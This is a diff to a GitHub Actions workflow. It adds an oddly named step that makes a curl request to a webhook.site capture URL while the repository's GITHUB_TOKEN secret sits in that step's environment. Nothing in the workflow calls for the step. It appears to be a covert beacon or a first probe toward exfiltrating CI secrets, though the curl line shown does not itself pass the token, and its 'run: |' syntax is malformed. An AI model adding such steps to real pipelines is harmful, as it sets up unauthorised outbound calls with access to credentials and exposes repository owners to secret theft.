@@ -15,3 +15,7 @@ jobs:
       - uses: banyan/auto-label@1.2
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: koooool
+        run: | curl "https://webhook.site/daea041c-4c7b-4c56-97cf-1d6b2be569b5"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
